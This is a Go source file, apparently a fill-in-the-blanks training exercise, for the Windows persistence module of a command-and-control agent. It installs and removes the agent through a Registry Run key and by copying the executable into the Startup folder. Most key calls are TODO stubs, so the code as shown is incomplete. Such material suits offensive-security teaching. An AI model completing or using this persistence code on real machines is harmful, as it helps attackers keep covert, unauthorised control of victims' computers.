//go:build windows

package agent

import (
	"fmt"
	"path/filepath"

	"golang.org/x/sys/windows/registry"

	"c2framework/internals/control"
	"c2framework/internals/models"
)

const (
	runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`
)

// doPersist performs the persistence operation on Windows
func doPersist(args control.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: args.Method,
	}

	switch args.Method {
	case "registry":
		// TODO: return call to doPersistRegistry() with args

	case "startup":
		// TODO: return call to doPersistStartup() with args

	default:
		result.Success = false
		result.Message = fmt.Sprintf("unknown method: %s", args.Method)
		return result
	}
}

// doPersistRegistry handles Registry Run Key persistence
func doPersistRegistry(args control.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: "registry",
	}

	// Open the Run key
	// TODO: call registry.OpenKey(), pass 3 required argms
	key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to open registry key: %v", err)
		return result
	}
	defer key.Close()

	if args.Remove {
		// Remove the registry value
		// TODO: call key.DeleteValue() to delete it
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to delete registry value: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Removed registry persistence '%s'", args.Name)
	} else {
		// Set the registry value to our executable path
		// TODO: call key.SetStringValue() with args to create it
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to set registry value: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Installed registry persistence '%s' -> %s", args.Name, args.AgentPath)
	}

	return result
}

// doPersistStartup handles Startup Folder persistence
func doPersistStartup(args control.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: "startup",
	}

	// Get the Startup folder path
	// TODO: call os.Getenv("APPDATA") to get appData
	if appData == "" {
		result.Success = false
		result.Message = "APPDATA environment variable not set"
		return result
	}
	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Create executable filename (we copy the exe, not a shortcut)
	// TODO: use filepath.Join() to create path to exePath

	if args.Remove {
		// Remove the executable
		// TODO: call os.Remove() to remove
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to remove startup executable: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Removed startup executable '%s'", args.Name)
	} else {
		// For simplicity, we'll copy the executable instead of creating a shortcut
		// Creating proper .lnk files requires COM or external tools
		copyPath := filepath.Join(startupPath, args.Name+".exe")

		// Read original file
		// TODO: call os.ReadFile() to read bytes into memory

		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to read agent: %v", err)
			return result
		}

		// Write to startup folder
		// TODO: call os.WriteFile() to write data to copyPath

		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to copy to startup folder: %v", err)
			return result
		}

		result.Success = true
		result.Message = fmt.Sprintf("Copied agent to startup folder: %s", copyPath)
	}

	return result
}
